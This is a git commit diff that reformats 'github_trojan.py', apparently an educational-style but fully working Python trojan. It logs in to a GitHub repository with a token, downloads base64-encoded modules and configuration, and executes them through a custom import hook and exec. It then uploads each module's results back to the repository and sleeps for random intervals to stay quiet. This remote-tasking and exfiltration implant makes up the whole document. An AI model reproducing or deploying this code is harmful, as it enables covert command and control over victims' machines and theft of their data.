b86a3911d556f7a83de75b4259474dfb49f8f48e
fToxicw <ftoxicw@163.com>
2022-06-30 14:36:08 +0800

    Update github_trojan.py

--- GIT/github_trojan.py
+++ GIT/github_trojan.py
@@ -3,7 +3,7 @@ This script will retrieve configuration options and run from GitHub.
 '''
 # Import needed packages
 import base64
-import github3 # GitHub API
+import github3  # GitHub API
 import importlib
 import json
 import random
@@ -13,21 +13,29 @@ import time
 
 from datetime import datetime
 
-# Connect to GitHub
+
 def github_connect():
-    with open('mytoken.txt') as f:
+    '''
+    Connect to Github
+    '''
+    with open('mytoken.txt') as f:  # Create mytoken.txt file in the current directory and then write your token in it
         token = f.read()
-    user = '<Username here>' # Your username here
+    user = '<Username here>'  # Your username here
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
 
-# Get the content of a file in GitHub
+
 def get_file_contents(dirname, module_name, repo):
+    '''
+    Get the content of a file in Github
+    '''
     return repo.file_contents(f'{dirname}/{module_name}').content
+
 
 class GitImporter:
     def __init__(self):
         self.current_module_code = ""
+
 
     def find_module(self, name, path=None):
         print("[*] Attempting to retrieve %s" % name)
@@ -38,6 +46,7 @@ class GitImporter:
             self.current_module_code = base64.b64decode(new_library)
             return self
 
+
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None,
                                                origin=self.repo.git_url)
@@ -46,16 +55,22 @@ class GitImporter:
         sys.modules[spec.name] = new_module
         return new_module
 
-# The Trojan module
+
 class Trojan:
+    '''
+    The Trojan module
+    '''
     def __init__(self, id):
         self.id = id
-        self.config_file = f'{id}.json' # The config file
-        self.data_path = f'data/{id}/' # Place to store data
-        self.repo = github_connect() # Connect to GitHub
+        self.config_file = f'{id}.json'  # The config file
+        self.data_path = f'data/{id}/'  # Place to store data
+        self.repo = github_connect()  # Connect to GitHub
 
-    # Get the configuration file
+
     def get_config(self):
+        '''
+        Get the configuration file
+        '''
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
 
@@ -64,17 +79,24 @@ class Trojan:
                 exec("import %s" % task['module'])
         return config
 
-    # Run a module
+
     def module_runner(self, module):
+        '''
+        Run a module
+        '''
         result = sys.modules[module].run()
         self.store_module_result(result)
 
-    # Store the result of a module
+
     def store_module_result(self, data):
+        '''
+        Store the result of a module
+        '''
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+
 
     def run(self):
         while True:
@@ -88,7 +110,7 @@ class Trojan:
 
             time.sleep(random.randint(30*60, 3*60*60))
 
-# Run script
+
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
     trojan = Trojan('config')
